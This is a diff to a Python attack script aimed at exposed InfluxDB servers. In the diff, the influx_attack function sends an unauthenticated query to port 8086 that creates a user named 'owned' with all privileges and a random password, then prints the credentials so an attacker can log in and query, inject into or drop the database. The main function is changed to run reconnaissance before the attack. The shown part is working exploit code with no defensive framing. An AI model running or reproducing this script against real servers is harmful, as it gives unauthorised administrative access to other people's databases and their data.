@@ -239,25 +239,26 @@ def influx_recon(target):
 
 def influx_attack(target):
     target_protocol = get_protocol(target)
-    print(target_protocol)
-    print("Attempting to create new user")
+    print(target_protocol,"\nAttempting to create new user")
     # Create random 8 character password. Function needed to make this password more complex. 
     password = make_password()
     # Need to create random string as password so attacker connection cannot be intercepted by defences.
     attack_string = f"CREATE USER owned with PASSWORD '{password}' WITH ALL PRIVILEGES"
+    # Send a create user query
     req = requests.post(f"{target_protocol}://{target}:8086/query?q={attack_string}", data=attack_string)
-    #req = requests.get(f"{target_protocol}://{target}:8086/query?q=CREATE USER owned WITH PASSWORD 'password' WITH ALL PRIVILEGES")
     print(req.text)
     # If the request is successful then give the credentials to login to start querying/injecting DB 
     if req.status_code == 200:
+       # Send the credentials to the attacker. Then you can login to the database
        print(f"User created\nCredentials: User: owned, Password: {password}")
     
 
 def main():
     target = sys.argv[1]
-    #recon = influx_recon(target)
+    # Information associated to the database which can help in confirming that influx is exposed. If no credentials needed then you can create a user and inject/drop/query the database 
+    recon = influx_recon(target)
+    # Attacker function should only work if recon script doesn't fail. Need to add some True/False checks.
     attack = influx_attack(target)
-    
-
+   
 if __name__ == '__main__':
         main()
